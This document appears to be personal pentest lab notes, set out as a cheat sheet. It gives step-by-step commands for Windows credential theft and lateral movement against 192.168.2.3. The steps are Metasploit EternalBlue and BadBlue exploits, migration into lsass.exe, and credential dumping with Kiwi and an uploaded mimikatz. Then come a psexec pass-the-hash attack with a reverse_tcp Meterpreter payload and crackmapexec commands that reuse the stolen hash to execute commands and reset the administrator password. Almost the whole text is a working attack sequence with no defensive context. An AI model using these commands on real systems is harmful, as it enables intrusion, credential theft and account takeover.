# Mimikatz 

"Kiwi - Extension for Meterpreter"
NTLM Hashes
Syskey finding

### Nmap Enum
```js
nmap 192.168.2.3 -sV
```

### Metasploit
```js
msf6> search eternalblue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS 192.168.2.3
msf6> run   // if error check TARGET

"migrate lsass.exe"
meterpreter> sysinfo
meterpreter> getuid
meterpreter> pgrep lsass     (ps -S lsass.exe)
789
meterpreter> migrate 789
meterpreter> getuid 

"kiwi"
meterpreter> load kiwi
meterpreter> ?
meterpreter> creds_all
meterpreter> lsa_dump_sam      (Syskey)
meterpreter> lsa_dump_secrets
```

### Kiwi
```js
meterpreter> load kiwi
meterpreter> ?
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
```

### Mimikatz
```js
meterpreter> pwd
meterpreter> cd C:\\
meterpreter> mkdir Temp
meterpreter> cd Temp
meterpreter> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
meterpreter> shell

C:> dir
C:> .\mimikatz.exe

mimikatz#> privilege::debug
mimikatz#> lsadump::sam
mimikatz#> lsadump::secrets
mimikatz#> sekurlsa::logonpasswords
mimikatz#> 
```


# Pass-The-Hash

### Metasploit
```js
msf6> search badblue
msf6> use exploit/windows/http/badblue_passthru
msf6> set RHOSTS 192.168.2.3
msf6> run

"migrate lsass.exe"
meterpreter> sysinfo
meterpreter> getuid
meterpreter> pgrep lsass     (ps -S lsass.exe)
789
meterpreter> migrate 789
meterpreter> getuid

```

### Kiwi
```js
meterpreter> load kiwi
meterpreter> lsa_dump_sam
// Take hashes and store in the txt document
// Like this
// Administrator: e3c61a68f1b89ee6c8ba9507378dc88d   (NTLM hash)
// Student: bd4ca1fbe028f3c5066467a7f6a73b0b   (NTLM Hash)
meterpreter> hashdump
// copy LM hash and NTLM hash for psexec
```

## PsExec (Metasploit)  --> Pass-The-Hash Attack
```js
msf6> use exploit/windows/smb/psexec
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set rhost 192.168.2.3
msf6> set lport 4422
msf6> set SMBUser Administrator
msf6> set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d              --> //LM:NTLM (hash)
msf6> run

msf6> sessions
msf6> set target
msf6> set target Command
msf6> exploit

msf6> sessions
msf6> set target
msf6> set target Native\ upload
msf6> run


meterpreter> sysinfo
meterpreter> getuid

```


### Crackmapexec
```js
crackmapexec smb 192.168.2.3 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d"   --> (NTLM Hash)
//Pwn3d!
crackmapexec smb 192.168.2.3 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
crackmapexec smb 192.168.2.3 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami"

//list 
crackmapexec smb 192.168.2.3 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "net user"
//change pass for admin
crackmapexec smb 192.168.2.3 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "net user administrator passowrd"

```


